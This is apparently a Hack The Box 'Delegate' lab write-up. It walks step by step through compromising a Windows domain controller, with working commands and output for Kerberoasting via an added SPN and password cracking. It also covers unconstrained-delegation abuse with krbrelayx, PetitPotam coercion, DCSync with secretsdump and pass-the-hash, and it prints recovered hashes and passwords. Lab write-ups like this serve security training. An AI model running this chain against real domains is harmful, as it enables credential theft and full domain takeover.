# Delegate-HTB
Lot'sa tips here for privesc in domain controllers 

Innitial Nmap report:
````
└─$ cat nmap_report.txt
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-18 19:26 -0300
Nmap scan report for 10.129.234.69
Host is up (0.31s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-18 22:26:40Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-11-18T22:28:05+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC1.delegate.vl
| Not valid before: 2026-11-17T13:52:45
|_Not valid after:  2027-05-19T13:52:45
| rdp-ntlm-info: 
|   Target_Name: DELEGATE
|   NetBIOS_Domain_Name: DELEGATE
|   NetBIOS_Computer_Name: DC1
|   DNS_Domain_Name: delegate.vl
|   DNS_Computer_Name: DC1.delegate.vl
|   DNS_Tree_Name: delegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-11-18T22:27:45+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
52065/tcp open  msrpc         Microsoft Windows RPC
53234/tcp open  msrpc         Microsoft Windows RPC
53813/tcp open  msrpc         Microsoft Windows RPC
60705/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
60706/tcp open  msrpc         Microsoft Windows RPC
60711/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-11-18T22:27:48
|_  start_date: N/A

TRACEROUTE (using port 53234/tcp)
HOP RTT       ADDRESS
1   327.92 ms 10.10.16.1
2   330.68 ms 10.129.234.69

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.54 seconds
````
Innitial nmap report is done. The domain name is: dc1.delegate.vl. Let's enum smb as guest via netexec:
````
└─$ netexec smb 10.129.234.69 -u 'guest' -p ''
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\guest: 
````
Let's see the shares we have access as guest:
````
└─$ impacket-smbclient -no-pass guest@10.129.234.69
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

# shares
Share Name                Type            Comment
----------------------------------------------------------------------
ADMIN$                    DISK (SPECIAL)  Remote Admin
C$                        DISK (SPECIAL)  Default share
IPC$                      IPC (SPECIAL)   Remote IPC
NETLOGON                  DISK            Logon server share 
SYSVOL                    DISK            Logon server share 
# use NETLOGON
# dir
*** Unknown syntax: dir
# ls
drw-rw-rw-          0  Sun Oct  1 06:08:32 2023 .
drw-rw-rw-          0  Sun Oct  1 06:08:32 2023 ..
-rw-rw-rw-        159  Sun Oct  1 06:08:32 2023 users.bat
````

Inside users.bat we find credentials for A.Briggs:
````
└─$ cat users.bat      
rem @echo off
net use * /delete /y
net use v: \\dc1\development 

if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator P4ssw0rd1#123 
````

I tried connecting via evil-winrm, but i had no success:
````
└─$ evil-winrm -i delegate.vl -u a.briggs -p P4ssw0rd1#123
                                        
Evil-WinRM shell v4.1
                                        
Info: Establishing connection to remote endpoint
                                        
Error: Cannot establish connection to remote endpoint. Check credentials and network.
                                        
Error: WinRM::WinRMAuthorizationError: WinRM::WinRMAuthorizationError
````
Let's check if they are valid credentials:
````
└─$ netexec smb 10.129.234.69 -u 'A.Briggs' -p 'P4ssw0rd1#123'
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\A.Briggs:P4ssw0rd1#123 
````
Port 445 allows for authentication via smb. This proves that the pair A.Briggs:P4ssw0rd1#123 is a valid pair. Now that we know we have compromised a valid acc, let's search through the ad with Bloodhound. First: we must scrape the ad from the point of view of A.Brigg, for that we'll use bloodhound. First we need to set it up:
````
sudo apt update
sudo apt install -y docker.io
````
If that works:
````
sudo systemctl enable --now docker
````
Then test it:
````
└─$ sudo docker run hello-world

Hello from Docker!
This message shows that your installation appears to be working correctly.

To generate this message, Docker took the following steps:
 1. The Docker client contacted the Docker daemon.
 2. The Docker daemon pulled the "hello-world" image from the Docker Hub.
    (amd64)
 3. The Docker daemon created a new container from that image which runs the
    executable that produces the output you are currently reading.
 4. The Docker daemon streamed that output to the Docker client, which sent it
    to your terminal.

To try something more ambitious, you can run an Ubuntu container with:
 $ docker run -it ubuntu bash

Share images, automate workflows, and more with a free Docker ID:
 https://hub.docker.com/

For more examples and ideas, visit:
 https://docs.docker.com/get-started/
````

Ok, docker is online, now download bloodhound:
````
mkdir -p ~/tools/bloodhound
cd ~/tools/bloodhound

wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz

tar -xvzf bloodhound-cli-linux-amd64.tar.gz

chmod +x bloodhound-cli

sudo ./bloodhound-cli install
````

Great, let's start bloodhound:
````
cd ~/tools/bloodhound
sudo ./bloodhound-cli containers start

[+] BloodHound is ready to go!
[+] You can log in as `admin` with this password: <your bd password>
[+] You can get your admin password by running: bloodhound-cli config get default_password
[+] You can access the BloodHound UI at: http://127.0.0.1:8080/ui/login
````

Awesome. Now copy-paste this at your browser:
````
http://127.0.0.1:8080/ui/login
````
To open your bloodhound ui. The logi via the credentials given to you:

<img width="768" height="721" alt="image" src="https://github.com/user-attachments/assets/a9e08b74-c798-45e7-81a1-92f120c1fe7d" />

The run trough the domain we'll use two tools: rusthound and bloodhound. First let's install rusthound, and since it's based on rust, first we need to install cargo:

````
sudo apt update
sudo apt install cargo
````

Then, include cargo in your PATH:
````
echo 'export PATH="$HOME/.cargo/bin:$PATH"' >> ~/.zshrc
source ~/.zshrc
````

Finally, install rusthound:

````
cargo install rusthound-ce
````

To get the zip file that'll be uploaded to bloodhound, execute:
````
─$ rusthound-ce --domain delegate.vl -u A.Briggs -p 'P4ssw0rd1#123' --zip
---------------------------------------------------
Initializing RustHound-CE at 10:43:39 on 11/26/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-11-26T13:43:39Z INFO  rusthound_ce] Verbosity level: Info
[2026-11-26T13:43:39Z INFO  rusthound_ce] Collection method: All
[2026-11-26T13:43:39Z INFO  rusthound_ce::transport] Transport: LDAP
[2026-11-26T13:43:39Z INFO  rusthound_ce::transport::ldap] Connected to DELEGATE.VL Active Directory on LDAP!
[2026-11-26T13:43:39Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-11-26T13:43:50Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=delegate,DC=vl
[2026-11-26T13:43:50Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-11-26T13:43:52Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext DC=delegate,DC=vl
[2026-11-26T13:43:52Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-11-26T13:43:52Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=delegate,DC=vl
[2026-11-26T13:43:52Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-11-26T13:43:52Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=delegate,DC=vl
[2026-11-26T13:43:52Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-11-26T13:43:58Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext CN=Configuration,DC=delegate,DC=vl
[2026-11-26T13:43:58Z INFO  rusthound_ce::api] Starting the Active Directory objects parsing...
⢀ Parsing Active Directory objects: 9%                                                                                                                                                                                                      [2026-11-26T13:43:58Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10                                                                                                                                                          
[2026-11-26T13:43:58Z INFO  rusthound_ce::api] Parsing Active Directory objects finished!
[2026-11-26T13:43:58Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-11-26T13:43:58Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-11-26T13:43:58Z INFO  rusthound_ce::modules::session] [sessions] 0 active target(s) after expiry/enabled filter
[2026-11-26T13:43:58Z INFO  rusthound_ce::modules::session] [sessions] 0 session(s) enumerated in total across 0 host(s)
[2026-11-26T13:44:04Z INFO  rusthound_ce::modules::gpo::sysvol] [gpo] collected directives from 1 GPO(s) on delegate.vl SYSVOL
[2026-11-26T13:44:04Z INFO  rusthound_ce::modules] [gpo] mapping 1 GPO(s) to GPOChanges / UserRights
[2026-11-26T13:44:04Z INFO  rusthound_ce::modules::localgroup] [localgroups] 0 active target(s) after expiry/enabled filter
[2026-11-26T13:44:04Z INFO  rusthound_ce::modules::localgroup] [localgroups] 0 edge(s) across 0 host(s)
[2026-11-26T13:44:04Z INFO  rusthound_ce::modules::webclient] [webclient] 0 active target(s) after expiry/enabled filter
[2026-11-26T13:44:04Z INFO  rusthound_ce::json::maker::common] 9 users parsed!
[2026-11-26T13:44:04Z INFO  rusthound_ce::json::maker::common] 61 groups parsed!
[2026-11-26T13:44:04Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2026-11-26T13:44:04Z INFO  rusthound_ce::json::maker::common] 1 ous parsed!
[2026-11-26T13:44:04Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-11-26T13:44:04Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-11-26T13:44:04Z INFO  rusthound_ce::json::maker::common] 75 containers parsed!
[2026-11-26T13:44:04Z INFO  rusthound_ce::json::maker::common] 1 sites parsed!
[2026-11-26T13:44:04Z INFO  rusthound_ce::json::maker::common] 1 siteservers parsed!
[2026-11-26T13:44:04Z INFO  rusthound_ce::json::maker::common] .//20261126104404_delegate-vl_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 10:44:04 on 11/26/26! Happy Graphing!
````
We are also gonna use rusthound-py:

````
sudo apt install bloodhound.py

─$ bloodhound-python -u A.Briggs -p 'P4ssw0rd1#123' -d delegate.vl -c all --zip -ns 10.129.234.69
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: delegate.vl
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc1.delegate.vl
INFO: Testing resolved hostname connectivity dead:beef::a39e:2d26:5521:adab
INFO: Trying LDAP connection to dead:beef::a39e:2d26:5521:adab
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc1.delegate.vl
INFO: Testing resolved hostname connectivity dead:beef::a39e:2d26:5521:adab
INFO: Trying LDAP connection to dead:beef::a39e:2d26:5521:adab
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC1.delegate.vl
INFO: Done in 00M 56S
INFO: Compressing output into 20261126104804_bloodhound.zip
````

OK, now we have zip files, go back unto bloodhound and upload them there:

<img width="883" height="682" alt="image" src="https://github.com/user-attachments/assets/b7ec5b04-7f3c-45ec-8bde-9b5de665ddcb" />

<img width="865" height="242" alt="image" src="https://github.com/user-attachments/assets/a47d971c-cb8c-414f-9d7f-b0b646a870f9" />

This'll generate a tompographic image of the domain controller that you can explore:

<img width="1916" height="727" alt="image" src="https://github.com/user-attachments/assets/8a63f676-0feb-4c23-b675-ce0dfaaba91c" />

Here we have A.Briggs (aleready sert as pwned), and as we can see we have Outbound Object Control for another user called N.Thompson:

<img width="1527" height="701" alt="image" src="https://github.com/user-attachments/assets/b580a164-13ff-42aa-97e6-557bbb362000" />

N.Thompson is member of the "remote management users" group:

<img width="1548" height="722" alt="image" src="https://github.com/user-attachments/assets/987da236-263e-40cf-8561-e949e1e31ef5" />

This means that it can probably authenticate via smb on 445:

<img width="1548" height="722" alt="image" src="https://github.com/user-attachments/assets/a62f747f-ab1b-42b6-b898-636b205c7ccb" />

A.Briggs having Outbound Object Control over N.Thompson means that it can modify or controll it. This allows us to add an SPN to N.Thompson that'll allow us to execute a kerberoasting attack.
To start:

````
bloodyAD -d delegate.vl --dc-ip 10.129.234.69 -u 'A.Briggs' -p 'P4ssw0rd1#123' set object N.Thompson servicePrincipalName -v 'http/anything'
[+] N.Thompson's servicePrincipalName has been updated
````
Then:
````
└─$ impacket-GetUserSPNs -dc-ip 10.129.234.69 -request -request-user N.Thompson delegate.vl/A.Briggs:'P4ssw0rd1#123'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name        MemberOf                                         PasswordLastSet             LastLogon                   Delegation 
--------------------  ----------  -----------------------------------------------  --------------------------  --------------------------  ----------
http/anything         N.Thompson  CN=delegation admins,CN=Users,DC=delegate,DC=vl  2023-09-09 12:17:16.247262  2023-09-16 04:18:20.238500             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$f851914d54025acab400760959b977e6$9784c3fc855d00552d1974eedd55a041ca6888c5126f376aa5fc985c45d3e01bd5524966695f24748fb2ee8d473235b621bbb2d14985c753a5ce09c39c357d0a5b43d14bc43ae3fb11d4b06b1a70efedbfa81c383a2bfd10dde6dd2c07378cf34fba962595d129fd3c53c5a3fb7b61cc0f1e783ad243b277425eed3fe3825180225d9af42b274ac2b6e3303eb6ea3b2fa5fdd2c9125a91cbbf027287af00fba6d3efdf1411811a8525fcd6a7b01c3aea07015a4a1b9c2e65ee0af5c3058add0202a7e2db8f7cce3f39151189e159d1a226dfb5e91ffbe882ba06ba043f1a4083dc7ae878d2b38563423e79e242fcb12edab7c74c99beda3c50210590753025645c322a2b9c49d57053a8895db0b6f4ad2c73b37f904d3fb30be83032d091650bc0452c574bd172c3fc685073f3a53e74e97e194d1a1f5b9d7864320123dc34970cb260b6e060d0746bce3ffd47ade1756666f762590d90e935e1a66c9e25a972f953d8f78ced7860796c02d1a808fe228b4a6ebc4a30671cd77e4c992e91bca46245ef440b33e8b7ea6942d34fb889c955ecf0de7c006f8ab5c7ee789802c3e02f9ff46345e19874056a89a9b6490af8e03f71662f97c587a22b159b8cb03bb514924e1df2091d8a21cb761ccb652859caa1e7b4ac3bb9099420b4d3d643e9c2f2e88d3c2fee94c3a350b43d449e8dd6f1d1c69d0a8496297a6162c2cd2886ae8af5776e8184ada6ab7b1f2bac0eda5fa129a9f2be5b08e7527acf3b493cfd7b94cc1ee676309eeeb5c4f1d8bf15ce727a8690a7866db4a63820f824898dfce62fa13744356c42f18e468de2049a4962b13ea29c2882e3d33d37edb0e5828bf40efcf10ab82f318f2faaadc6474d02abd5735606278d3653a90b8402dd851f0f0ba7e43c65ea64e82e8cf049a8181fd085ae0e90d8917a4f385a594d5e85d305e74348037bded6fc121d0fa11f5318fbef69bfb958234073a4c042d4ad9e0d26c3d7be57c299e06572e282d84239184f260da03acf4e515d2b25aef57e1153362bd23b22c967942e2a634c56a716251193f99f6c594b853689370c480110bc328b56c9dc58117d8d815bbe4499ee10046e50b43d9d490cd74e7b30db4f3c26f66fa98c0ba0f82abe56470018b4177fc26fbd96d9719687d0af9eed35312fa4647674f9aa143ce41d0f58813a69c2a9805b7e2482dd9faa3d794480c579173d74b29b797cdd3ccb71a4ad1da227da520dddf43051589297c8c996126de02902449cc2f7fcacb8f74fa445b97249fec1b1a9b2b04d0587cf0736fff7ebae4cc923031cbbddd69decffd0f8b2936fb177aa91937d7aabf88902ffa1862f13bb18f594b166a69b8277274c5f5bbff01de25bcb7ac439e40593b8c2badd9d811c31a8691853a064fb5cfa9e5790ca737bc3af3516b9243e6e2afa5e0d8f66d260371cb8a9cd97
````

Ok, now we crack it with john the ripper:

````
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS-REP etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
KALEB_2341       (?)     
1g 0:00:00:08 DONE (2026-11-26 15:13) 0.1245g/s 1370Kp/s 1370Kc/s 1370KC/s KANGOL1..KALASIN@2525
Use the "--show" option to display all of the cracked passwords reliably
Session completed
````

Ok, we got the password for N.Thompson, We just need to connect via win-rm and then grab the user flag:

````
└─$ evil-winrm -i delegate.vl -u n.thompson -p KALEB_2341

                                        
Evil-WinRM shell v4.1
                                        
Info: Establishing connection to remote endpoint
                                        
Info: Connection successful
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> 
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> cd ../desktop
*Evil-WinRM* PS C:\Users\N.Thompson\desktop> type user.txt
fb3a973aa6fe4db0645314636a309dd7
*Evil-WinRM* PS C:\Users\N.Thompson\desktop> 
````

Now for the priv esc. There is nothing of interest inside n.thompson, nothing except: SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled.

<img width="1362" height="195" alt="image" src="https://github.com/user-attachments/assets/49dd424e-cd46-4948-a83f-29c3c284e46a" />

First we add a new machine acc:
````
impacket-addcomputer -dc-ip 10.129.234.69 -computer-name spaz delegate.vl/N.Thompson:'KALEB_2341'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account spaz$ with password iJU2wFGB8phqQDf0R7RWFOZjF5avzJIn.
````

Once the account is created, we will modify the TRUSTED_FOR_DELEGATION flag to configure this computer to have Unconstrained Delegation.

````
bloodyad -u 'N.Thompson' -d 'delegate.vl' -p 'KALEB_2341' --host '10.129.234.69' add uac 'spaz$' -f TRUSTED_FOR_DELEGATION
[+] ['TRUSTED_FOR_DELEGATION'] property flags added to spaz$'s userAccountControl
````

Additionally, we need to configure DNS and SPN to allow any user/computer object to authenticate to the PWN$ computer using Kerberos. We will use Dirkjanm's krbrelayx to add a DNS record, SPN to spaz$ and listen on SMB for incoming connections.

````
git clone https://github.com/dirkjanm/krbrelayx
````

You may have to install the ldap3 dependecie:
````
python3 ./dnstool.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -r spaz.delegate.vl -d 10.10.17.219 --action add 10.129.234.69
Traceback (most recent call last):
  File "/home/spaz/tools/krbrelayx/./dnstool.py", line 40, in <module>
    from ldap3_ad_auth import bind_kerberos, bind_ntlm
ModuleNotFoundError: No module named 'ldap3_ad_auth'
````

That's easy, just make a venv and install it with pip:

````
python3 -m pip install ldap3-ad-auth
````
Now dnstool will work:

````
└─$ python3 ./dnstool.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -r spaz.delegate.vl -d 10.10.17.219 --action add 10.129.234.69 
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
````

Great! Once the DNS is added, we will add SPN cifs/spaz which allows SMB connections with Kerberos authentication.
````
python3 ./addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/spaz' -t 'spaz$' -dc-ip 10.129.234.69 10.129.234.69 
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
````

Once the SPN is added, addspn.py or BloodyAD can be used to verify all existing entries to the computer object.

````
bloodyad -d delegate.vl --dc-ip 10.129.234.69 -u 'N.Thompson' -p 'KALEB_2341' get object 'spaz$' --attr 'servicePrincipalName'
````

After 180 seconds, the DNS should also be synced. We can use the dig command to verify that, or simply ping spaz from the WinRM session to check for connectivity.

````
└─$ dig spaz.delegate.vl @10.129.234.69

; <<>> DiG 9.20.30-1-Debian <<>> spaz.delegate.vl @10.129.234.69
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 15250
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;spaz.delegate.vl.              IN      A

;; ANSWER SECTION:
spaz.delegate.vl.       180     IN      A       10.10.17.219

;; Query time: 159 msec
;; SERVER: 10.129.234.69#53(10.129.234.69) (UDP)
;; WHEN: Thu Nov 26 17:41:24 -03 2026
;; MSG SIZE  rcvd: 61
````

Once all the prerequisites are verified, we will convert the password of the SPAZ$ computer object to RC4 and use it with krbrelayx.py to listen for incoming connections.

````
python3 -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4","iJU2wFGB8phqQDf0R7RWFOZjF5avzJIn".encode("utf-16le")).digest()).decode())'
6a49008ae04e161fb773a2eb23cdef9f
````
Now we use it ot set up a kbrelaix listener:
````
└─$ python3 ./krbrelayx.py -hashes :6a49008ae04e161fb773a2eb23cdef9f
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Running in export mode (all tickets will be saved to disk). Works with unconstrained delegation attack only.
[*] Running in unconstrained delegation abuse mode using the specified credentials.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections
````
On the other hand, we will use PetitPotam.py to force the Domain Controller to authenticate to
pwn DNS entry, which points to cifs/spaz SPN, which is configured on SPAZ$ computer object,
which is ultimately configured with Unconstrained Delegation.

````
└─$ python3 PetitPotam.py -target-ip 10.129.234.69 -u 'spaz$' -p 'iJU2wFGB8phqQDf0R7RWFOZjF5avzJIn' spaz dc1.delegate.vl
/home/spaz/tools/PetitPotam/PetitPotam.py:23: SyntaxWarning: "\ " is an invalid escape sequence. Such sequences will not work in the future. Did you mean "\\ "? A raw string is also an option.
  | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __

                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe lsarpc
[-] Connecting to ncacn_np:dc1.delegate.vl[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
````
We can export the ticket and use it with impacket-secretsdump to perform a DCsync attack and
get Administrator RC4 and AES Keys.

````
└─$ KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache impacket-secretsdump -just-dc-user Administrator -k dc1.delegate.vl
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c32198ceab4cc695e65045562aa3ee93:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f877adcb278c4e178c430440573528db38631785a0afe9281d0dbdd10774848c
Administrator:aes128-cts-hmac-sha1-96:3a25aca9a80dfe5f03cd03ea2dcccafe
Administrator:des-cbc-md5:ce257f16ec25e59e
[*] Cleaning up... 
````

Now use the RC4 key to auth as Administrator
````
└─$ evil-winrm -i 10.129.234.69 -u Administrator -H c32198ceab4cc695e65045562aa3ee93
                                        
Evil-WinRM shell v4.1
                                        
Info: Establishing connection to remote endpoint
                                        
Info: Connection successful
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../desktop/root.txt
71a954624b2f1814f03a314378bd3495
````
